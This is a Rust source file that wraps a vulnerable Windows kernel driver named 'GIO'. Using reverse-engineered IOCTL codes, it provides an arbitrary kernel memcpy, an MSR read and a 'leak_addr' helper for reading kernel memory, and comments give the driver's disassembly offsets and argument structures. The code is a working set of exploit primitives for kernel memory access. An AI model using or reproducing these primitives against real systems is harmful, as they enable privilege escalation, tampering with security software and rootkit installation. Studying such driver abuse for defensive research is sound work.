use windows::Win32::Foundation::*;
use crate::kdriver::KernelDriver;

pub struct GIOPrimatives {
    driver: KernelDriver,
}

impl GIOPrimatives {

    pub fn new() -> GIOPrimatives {
        GIOPrimatives { driver: KernelDriver::new("GIO")}
    }

    /*   .text:00000001400029B4 ioctl_memcpy proc near

        IOCTL: 0x0C3502808

        struct memcpy_func {
            LPVOID dest        //0x00
            LPVOID src         //0x08
            DWORD size         //0x10
        }

     */ 
    pub fn memcpy(&self, src: u64, dest: u64, size: u32) {
        const IOCTL_MEMCPY: u32 = 0x0C3502808;

        // Pack Args
        let mut args: Vec<u8> = dest.to_le_bytes().to_vec();
        args.append(&mut src.to_le_bytes().to_vec());
        args.append(&mut size.to_le_bytes().to_vec());

        let success: bool = self.driver.send_ioctl(IOCTL_MEMCPY, &mut args, None);
        if !success {
            panic!("Memcpy IOCTL {:x} Failed: {}", IOCTL_MEMCPY, unsafe{GetLastError().0});
        }
    }

    /*
        .text:000000014000234C

        IOCTL: 0x0C3502580

        struct msr_func {
            DWORD read_write; (0 == write, 1 == read)
            DWORD msr;
            QWORD data;
        }

     */
    pub fn read_msr(&self, msr: u32) -> u64 {
        const IOCTL_MSR: u32 = 0x0C3502580;

        // Pack Args
        let mut args: Vec<u8> = (1 as u32).to_le_bytes().to_vec();
        args.append(&mut msr.to_le_bytes().to_vec());
        args.append(&mut vec![0; 8]);
        let mut outbuf = vec![0; 0x10];

        let success = self.driver.send_ioctl(IOCTL_MSR, &mut args, Some(&mut outbuf));
        if !success {
            panic!("MSR IOCTL {:x} Failed: {}", IOCTL_MSR, unsafe{GetLastError().0});
        }
        return u64::from_le_bytes(outbuf.as_slice()[8..].try_into().unwrap());
    }

    // use memcpy to leak an address from the kernel.
    pub fn leak_addr(&self, addr: u64) -> u64 {
        let mut buf: Vec<u8> = vec![0; 0x8];
        self.memcpy(addr, buf.as_mut_ptr() as _, buf.len() as _);
        u64::from_le_bytes(buf.as_slice().try_into().unwrap())
    }

}